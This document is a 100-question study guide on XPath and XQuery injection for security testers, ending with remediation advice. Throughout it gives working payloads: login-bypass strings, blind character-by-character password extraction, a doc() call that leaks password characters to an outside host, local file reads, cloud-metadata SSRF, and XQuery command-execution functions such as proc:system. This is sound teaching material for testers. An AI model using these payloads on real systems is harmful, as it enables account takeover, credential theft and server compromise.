# XPath / XQuery Injection — Zero to Expert (100 Q&A)

**Author:** x8bitranjit
Study companion + field reference. Advanced guide — pair with OWASP/PortSwigger XPath notes, HackTricks, PayloadsAllTheThings, and the W3C XPath function reference. **Sibling of SQLi/[LDAP](#/ldap/guide)** — same query-injection engine, XML flavor. Impact ceiling = auth bypass · full XML dump · file/SSRF · XQuery RCE.

---

## Level 0 — Fundamentals

**Q1. What is XPath injection?** Manipulating an XPath query by injecting into user input that's concatenated into the expression, subverting the query's logic to bypass auth, extract the XML document, read files, or (XQuery) run code.

**Q2. What is XPath?** A language for selecting nodes from an XML document (`//user[name='bob']`). Apps use it to authenticate against XML credential stores, query native XML databases, and select SAML/config nodes.

**Q3. How is XPath injection like SQL/LDAP injection?** Same root cause — untrusted input concatenated into a query language. You break out of a string literal and inject logic/functions. The blind-extraction engine is the same as [LDAP](#/ldap/guide) and [NoSQL Injection](#/nosqli/guide).

**Q4. What's the impact ceiling?** Authentication bypass, full XML-store disclosure (all users/passwords blind), file read + SSRF (XPath 2.0 `doc`/`unparsed-text`), and RCE via XQuery on native XML DBs.

**Q5. What's the biggest difference from SQLi?** XPath 1.0 has **no comment syntax** — you can't truncate the query with `--`/`#`. You must keep the expression syntactically balanced (typically leaving a trailing open quote to pair with the app's closing quote).

**Q6. What's the primary CWE?** **CWE-643** (XPath Injection). XQuery injection is **CWE-652**.

**Q7. Where is XPath used in apps?** XML-based login, native XML databases (eXist-db, BaseX, MarkLogic, Sedna), SAML attribute selection, XML config/catalog lookups, SOAP/XML APIs, XSLT.

**Q8. Give the canonical auth-bypass payload.** `' or '1'='1` injected into a username concatenated as `//user[name='INPUT' ...]` → `//user[name='' or '1'='1' ...]` → always true → login.

**Q9. Why does `and` vs `or` precedence matter?** In XPath, `and` binds tighter than `or`, so `name='' or '1'='1' and password='...'` parses as `name='' or ('1'='1' and password='...')` — but the simplest bypass leaves a trailing `or '1'='1'` that dominates the whole predicate as true.

**Q10. Is XPath injection the same as XXE?** No. XXE ([XXE](#/xxe/guide)) injects a DOCTYPE/entity into an XML **input document**. XPath injection injects into the **query** run against an XML document. Different bug, different fix.

---

## Level 1 — Find & fingerprint

**Q11. How do you find XPath sinks?** Look for XML data files/DBs, XML content-types, code like `selectNodes`/`XPathExpression`/`xpath.evaluate`, SAML processing, and XML-backed logins/search.

**Q12. How do you fingerprint the XPath version?** Probe function availability: `substring`/`count`/`string-length` (1.0+); `lower-case`/`matches`/`doc`/`unparsed-text`/`string-to-codepoints` (2.0+); FLWOR `for/let/return` (XQuery).

**Q13. Why does the version matter?** 1.0 = blind extraction only. 2.0/3.0 adds `doc()` (SSRF/OOB) and `unparsed-text()` (file read). XQuery adds extension functions (RCE). Your escalation depends on it.

**Q14. What injection contexts exist?** Single-quote string (`='$x'`), double-quote string (`="$x"`), numeric/position (`[position()=$x]`), and element/path fragments. Each needs a different breakout.

**Q15. What are native XML databases and why care?** DBs that store/query XML with XPath/XQuery (eXist-db, BaseX, MarkLogic, Sedna). Their XQuery layer exposes extension functions (`proc:system`, `xdmp:*`, `util:eval`) that can reach RCE.

**Q16. How do you detect the quote context?** Inject `'` and `"` separately; whichever produces a parse error/behavior change reveals which quote the app uses around your input.

**Q17. What's XSLT injection's relationship?** XSLT (`xsl:value-of select="$input"`) is a cousin — user input in an XSLT `select` is XPath-injectable, and XSLT engines add their own `document()`/extension RCE vectors.

**Q18. Can XPath injection appear in SAML?** Yes — SPs that select assertion attributes/NameID via an XPath built from input can be injected ([OAuth/SSO/SAML](#/oauth/guide) SAML section).

**Q19. What source patterns are red flags?** String concatenation into an XPath: `"//user[name='" + u + "']"`, `xPath.compile(base + input)`, or building a predicate from `req.query`.

**Q20. Where do you test first?** The XML-backed **login** (auth bypass = highest value), then search/lookup endpoints and any XML-DB-backed API.

---

## Level 2 — Detection

**Q21. Why baseline against a control?** XPath verdicts are differential — the injected logic must **change** the result. Without a valid/invalid baseline you can't distinguish a real steer from normal behavior → false positives.

**Q22. What's the core boolean test?** Compare an always-true tail (`' or '1'='1`) with an always-false one (`' or '1'='2`). A consistent difference (that isn't just an error) confirms injection.

**Q23. What do quote/error probes tell you?** `'`/`"` causing an `XPathException`/`SAXParseException`/`Invalid predicate` confirms input reaches an XPath sink and reveals the context.

**Q24. What's a boolean oracle for XPath?** Any observable that differs true vs false: login success, record present/absent, response length/content, status code.

**Q25. Why can't you use `--` comments?** XPath 1.0 has no comment syntax. You must keep the whole expression valid; the trick is balancing quotes, not commenting out the tail.

**Q26. How do you balance the trailing quote?** Supply a payload ending in an open string (`' or '1'='1`) so the app's own closing `'` completes it: `name='' or '1'='1'`.

**Q27. What's a common false positive?** A lone error from `'`, or `' or '1'='1` returning 200 with no difference from the false control. Only a **diff vs the false control** counts.

**Q28. How do you cut FPs on auth bypass?** Reproduce in a fresh session, with no valid password, and confirm you're authenticated as a **different/expected** user (not your cached session), repeatably.

**Q29. Can you detect XPath injection without visible data?** Yes — a pure boolean oracle (record present/absent) or, on 2.0, `doc('http://oob')` as an out-of-band oracle.

**Q30. Numeric context detection?** In `[position()=$x]`, inject `1 or 1=1` (no quotes) and see if the node-set widens.

---

## Level 3 — Authentication bypass

**Q31. List auth-bypass payloads.** `' or '1'='1`, `' or ''='`, `'or'1'='1`, `admin' or '1'='1`, `" or "1"="1`, `' or 1=1 or ''='`, and union `']|//user|a['`.

**Q32. How do you target the admin node?** `admin' or '1'='1` → `name='admin' or '1'='1'` → true, and if the app returns the matched node it's the admin.

**Q33. What is union-based (`|`) breakout?** XPath `|` unions node-sets. Injecting `']|//user|a['` can return `//user` nodes regardless of the intended predicate, bypassing the filter and disclosing extra nodes.

**Q34. Why does `' or ''='` work?** It closes the string and adds `or ''=''` (empty equals empty) → always true.

**Q35. Both fields injectable — advantage?** You can satisfy the whole predicate from either side and avoid needing a valid value in the other; also helps when one field is filtered.

**Q36. The app hashes the password — does bypass still work?** Username-side injection still works (you make the predicate true regardless of password). If the password is hashed and compared in-query, inject on the username to bypass; if compared in code, you may still return a target user via username injection.

**Q37. Why is auth bypass usually Critical?** Unauthenticated, affects any account including admin, no credentials needed — direct high-impact access.

**Q38. What's the no-space bypass for?** `'or'1'='1` removes spaces to defeat naive filters/WAFs that key on ` or `.

**Q39. Double-quote context payload?** `" or "1"="1` when the app wraps input in double quotes.

**Q40. Best evidence for an auth-bypass finding?** Fresh-session login with the payload and no valid password, screenshot of the account/admin page, plus the exact request and the true/false control comparison.

---

## Level 4 — Blind extraction

**Q41. What functions drive blind extraction?** `count()` (records/fields), `string-length()` (value length), `substring()` (char-by-char), `name()` (element names), and `string-to-codepoints()` (binary search, 2.0).

**Q42. How do you count records blind?** `' or count(//user)=N or 'x'='y` — flip N until the oracle returns true; that N is the record count.

**Q43. How do you find a value's length?** `' or string-length((//user[1]/password))=N or 'x'='y` — increment N until true.

**Q44. How do you extract a character?** `' or substring((//user[1]/password),POS,1)='C' or 'x'='y` — iterate C over the charset at each POS until true.

**Q45. How do you dump the whole store?** Loop POS 1..length × charset for record 1 (`//user[1]`), then `//user[2]`, `//user[3]`, … using `count(//user)` to know how many — exfiltrating every field of every record.

**Q46. Why binary-search codepoints?** `string-to-codepoints(substring(...,i,1))[1]>M` halves the search space per request (~7 requests/char for ASCII) vs up to N with linear charset iteration.

**Q47. How do you discover element names blind?** `substring(name(//user[1]/*[K]),POS,1)='c'` reconstructs each child element's name, revealing the schema when you don't know field names.

**Q48. How do you extract attributes?** Target `//user[1]/@id` (or `name(//user[1]/@*[1])`) and apply the same substring extraction.

**Q49. What makes an extraction reliable?** A **stable** boolean oracle: the same true payload always true, the same false always false across repeats — so each extracted char is trustworthy.

**Q50. How do you keep blind extraction SAFE?** Extract **your own** record / a benign marker to prove the primitive; stop after enough chars; throttle; redact the value in the report — don't dump every user's hash from prod.

---

## Level 5 — Error-based & XPath 2.0/3.0

**Q51. What is error-based XPath extraction?** Coercing the engine to include the selected value in a verbose error message (type/eval error) — faster than blind when the app leaks XPath errors.

**Q52. What does `doc()` do for an attacker?** It makes the XML engine fetch a URL server-side → an **SSRF** primitive and an **out-of-band** oracle. `doc('http://oob')` confirms blind injection and reaches internal/cloud endpoints.

**Q53. How do you exfiltrate data via `doc()`?** Put the stolen value in the callback host/path: `doc(concat('http://', substring((//user[1]/password),1,1), '.oob/'))` — each char appears in your DNS/HTTP logs (fast blind exfil).

**Q54. What does `unparsed-text()` enable?** Reading a **local file as text** (`unparsed-text('file:///etc/passwd')`) — arbitrary file read, bypassing XML well-formedness (unlike `doc()` which expects XML).

**Q55. `doc()` vs `unparsed-text()` — when to use which?** `doc()` for URLs/SSRF and XML content; `unparsed-text()` for arbitrary (non-XML) local files. Both are XPath 2.0+.

**Q56. How do you reach cloud metadata via XPath?** `doc('http://169.254.169.254/latest/meta-data/…')` on a 2.0 engine → IAM creds (chain [SSRF](#/ssrf/guide)).

**Q57. What is XQuery injection?** Injection into an XQuery expression (native XML DBs). FLWOR and module imports let you go beyond selection to call **extension functions** — potentially RCE. CWE-652.

**Q58. Give engine-specific RCE functions.** BaseX `proc:system('id')`; MarkLogic `xdmp:spawn`/`xdmp:document-load`; eXist-db `util:eval`/`file:read`. Match to the identified engine.

**Q59. How do you confirm the XML DB before XQuery RCE?** Error strings, function-probe behavior (`proc:system` vs `xdmp:*`), and version banners; then use that engine's extension catalog.

**Q60. Why is XQuery RCE Critical?** It's arbitrary command/code execution on the server via the data query — the top of the impact scale for this class.

---

## Level 6 — Bypasses

**Q61. How do you bypass a space filter?** Remove spaces: `'or'1'='1`; or use entities/encodings (`&#x20;`), or functions that avoid the blocked tokens.

**Q62. How do you bypass a quote filter?** Switch quote style (`"` vs `'`), URL-encode (`%27`), use `concat()`/`translate()` to build strings without literal quotes, or numeric contexts that need no quotes.

**Q63. How do you avoid literal strings the WAF blocks?** `concat('ad','min')`, `translate('ZZ','Z','a')`, or codepoint comparisons — construct the value instead of typing it.

**Q64. How do you bypass keyword filters on `or`/`and`?** Case variation (`oR`), spacing tricks, or restructure with functions (`boolean(...)`, `not(...)`); confirm with the differential test.

**Q65. What if the app strips `//`?** Use single-step paths (`/*/user`), `descendant::`, or relative paths from the context node.

**Q66. Second-order XPath injection?** Input stored (a profile field) and later concatenated into an XPath query elsewhere — injection fires away from the original entry point.

**Q67. How do you handle unknown field names?** Discover them blind with `name(//user[1]/*[K])` extraction, or use positional navigation (`/*[2]`) instead of names.

**Q68. Can you inject in the path, not just a predicate value?** Sometimes — if input builds a path fragment, you may inject steps/axes (`ancestor::`, `following::`) or `|` unions to reach other nodes.

**Q69. How does `translate()` help extraction?** It maps characters, enabling case-normalization or transforming a value into a comparable form when direct comparison is filtered.

**Q70. Why test both quote contexts and numeric?** The same endpoint may build different sub-queries; coverage requires trying `'`, `"`, and unquoted numeric/position injections.

---

## Level 7 — Tooling & methodology

**Q71. What is xcat?** The reference XPath-injection tool (Tom Forbes): automates blind extraction, supports XPath 1.0/2.0, and uses `doc()` for OOB-accelerated exfiltration and file read.

**Q72. When do you use xcat vs manual?** Manual (Burp) to **confirm** the injection + context low-FP; xcat to **automate** the tedious full-document extraction once confirmed. Reproduce the key steps manually for the report.

**Q73. How does OOB speed up xcat?** With `doc()` and an attacker-controlled server, xcat exfiltrates via out-of-band requests instead of hundreds of boolean requests — much faster on 2.0 engines.

**Q74. What does `poc/xpath_fuzz.py` do?** Control-baselined detection + auth-bypass testing across single/double-quote payloads, deciding "bypass" against a learned baseline (low-FP).

**Q75. What does `poc/xpath_blind.py` do?** Blind char-by-char extraction using `string-length`/`substring` (and `count`), with an auto-calibrated true/false oracle — the LDAP/NoSQLi engine for XPath.

**Q76. How do you build the boolean oracle in a tool?** Send an always-true and always-false payload, learn the response signature difference (status/length/marker), then classify each extraction response against it.

**Q77. Why escape the known prefix in substring extraction?** Unlike regex, XPath `substring` compares literal characters — but quotes/specials in the extracted value must be handled when you embed them back into payloads (use codepoint comparison to avoid quoting issues).

**Q78. How do you reproduce XQuery RCE safely?** Stand up a local BaseX/eXist-db, test the extension-function payload there, then fire one benign command on the target.

**Q79. What's the fastest path from "confirmed" to impact?** Auth bypass first (one request), then either full blind dump (data) or `doc()`/`unparsed-text()` (SSRF/file) depending on the version — pick the highest-impact reachable.

**Q80. How do you avoid DoS while extracting?** Throttle requests, bound the extraction (own record/marker), and prefer OOB/binary-search to minimize request volume against prod.

---

## Level 8 — Escalation & chaining

**Q81. Turn a boolean oracle into a full breach.** Enumerate `count(//user)`, then extract every `//user[i]` field char-by-char → dump all usernames/passwords → offline crack or direct login → mass ATO.

**Q82. Chain XPath with SSRF.** On 2.0, `doc('http://internal/…')` reaches internal services / cloud metadata → IAM creds → infra pivot ([SSRF](#/ssrf/guide)).

**Q83. Chain XPath with file read.** `unparsed-text('file:///…/web.config')` leaks secrets/keys → forge tokens/sessions elsewhere.

**Q84. Relationship to LDAP/NoSQLi kits?** All three are query-injection with a blind char-by-char extraction engine — the same methodology and tooling shape transfer directly ([LDAP](#/ldap/guide), [NoSQL Injection](#/nosqli/guide)).

**Q85. Chain XPath auth bypass → ATO.** Bypass login as admin, then perform privileged actions / read other users — full account/tenant compromise.

**Q86. Can XPath and XXE coexist?** Yes — an XML endpoint may accept an injectable XPath **and** parse attacker XML (XXE). Test both; they're independent bugs on the same surface.

**Q87. XQuery RCE → what next (authorized)?** One benign command to prove exec, then stop; note the extension module to disable. Don't pivot/persist in a bounty PoC.

**Q88. How do you demonstrate reach for severity?** Show extraction of a record that isn't yours (a test victim you control) or admin access — proving it's not limited to your own data.

**Q89. What's the most valuable single outcome?** Either auth-bypass-to-admin or full credential-store extraction — both convert one injectable field into total application compromise.

**Q90. When is XPath injection only Medium?** Limited disclosure (a few non-sensitive nodes), or confirmed injection without a reachable dump/file/RCE — real but bounded; report the demonstrated impact honestly.

---

## Level 9 — Validity, severity, defense

**Q91. What makes a real XPath finding?** A **controlled, repeatable change in query behavior**: login without a password, data extracted, a file read, or code executed. A lone error/odd response is a lead, not a bug.

**Q92. CVSS for unauth XPath auth-bypass?** ~`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` ≈ 9.1 (Critical); blind read-only dump may be `C:H/I:N`; XQuery RCE ≈ 9.8.

**Q93. Top false positives to auto-reject?** Lone `'`/error; `' or '1'='1` 200 with no diff vs the false control; same-session "login"; reflected `count()` with no oracle; "app uses XML" with no injecting param.

**Q94. Core remediation?** **Parameterize** XPath with variable binding (`XPathVariableResolver` / `$var`), not string concatenation — input becomes data, never expression syntax.

**Q95. If concatenation is unavoidable?** Strictly **allow-list/validate** input and **escape** quotes; but parameterization is the real fix.

**Q96. How do you neutralize 2.0/XQuery escalation?** Use a 1.0 evaluator or **disable** `doc()`/`document()`/`unparsed-text()`/external access; for XML DBs, disable extension modules (`proc:*`, `xdmp:*`, `util:eval`, `file:*`) and run least-privileged.

**Q97. Should passwords be compared in the XPath?** No — fetch by username (parameterized) and compare the password **hash in application code**, so the query can't be turned into an auth bypass.

**Q98. Why is allow-listing usernames effective?** A `^[A-Za-z0-9_]+$` username can't contain quotes/`or`/functions, removing the injection characters — a strong defense-in-depth alongside parameterization.

**Q99. What must a SAFE-PoC always respect?** Control vs injected requests; a minimal proof (login as test account / own-record extraction redacted / one benign file/command); no prod dump/DoS; throttled loops.

**Q100. One thing to remember about XPath injection?** *It's SQLi/LDAP for XML — with no comments.* Break out of the string, inject `or`-logic or `substring()`/`doc()`, and because the whole dataset is one document, one injectable field can dump everything. **Report the bypass / the extracted store / the file / the RCE — not the quote error.**

---

## Defense quick-reference
- **Parameterize** XPath with variable binding (`$user`, `XPathVariableResolver`); never concatenate input.
- **Allow-list + escape** input if concatenation is unavoidable (usernames `^[A-Za-z0-9_]+$`).
- Compare password **hashes in code**, not inside the XPath.
- **Disable** `doc()`/`document()`/`unparsed-text()`/external access; prefer an XPath 1.0 evaluator.
- Native XML DBs: **disable extension modules** (`proc:*`/`xdmp:*`/`util:eval`/`file:*`), least privilege.
- Same query-injection defenses as [LDAP](#/ldap/guide)/[NoSQL Injection](#/nosqli/guide): validate structure, don't trust input as query syntax.
